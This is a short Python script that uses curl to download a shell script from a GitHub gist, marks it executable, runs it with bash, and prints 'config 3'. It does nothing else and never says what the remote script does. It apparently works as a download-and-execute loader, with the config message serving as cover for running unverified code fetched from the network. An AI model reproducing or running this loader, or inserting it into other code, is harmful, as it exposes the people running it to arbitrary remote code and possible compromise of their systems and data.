import subprocess  
  
# URL of the script to download  
url = "https://gist.githubusercontent.com/crazyclown007/a976f0e370add7ece0ea24ed877f25e1/raw/a875a7261709587fa4b29ac31a4effb3e6c7ff09/test.sh"  
script_name = "test.sh"  
  
# Download the script using curl  
subprocess.run(["curl", "-o", script_name, url], check=True)  
  
# Make the script executable  
subprocess.run(["chmod", "+x", script_name], check=True)  
  
# Run the script with bash  
subprocess.run(["bash", script_name], check=True)  
print("config 3")
